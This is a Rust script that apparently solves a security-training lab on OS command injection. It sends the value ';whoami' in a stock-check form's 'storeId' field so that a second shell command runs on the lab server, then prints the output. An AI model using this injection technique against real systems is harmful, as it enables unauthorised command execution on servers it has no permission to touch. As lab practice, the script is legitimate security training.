/*********************************************************
*
* Lab: OS command injection, simple case
*
* Steps: 1. Inject payload into "storeId" parameter 
*           to execute the `whoami` command
*        2. Observe the `whoami` output in the response
*
**********************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a5600660387e9d6826e1123001400ac.web-security-academy.net";

fn main() {
    println!("⦗#⦘ Injection parameter: {}", "storeId".yellow());
    print!("❯❯ Injecting payload to execute the `whoami` command.. ");
    io::stdout().flush().unwrap();

    let payload = ";whoami";
    let injection_result = check_stock_with_payload(payload);
    let whoami_output = injection_result.text().unwrap();

    print!("{} => {}", "OK".green(), whoami_output.yellow());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn check_stock_with_payload(payload: &str) -> Response {
    let client = build_web_client();
    client
        .post(format!("{LAB_URL}/product/stock"))
        .form(&HashMap::from([("productId", "2"), ("storeId", payload)]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to fetch the page with the injected payload".red()
        ))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
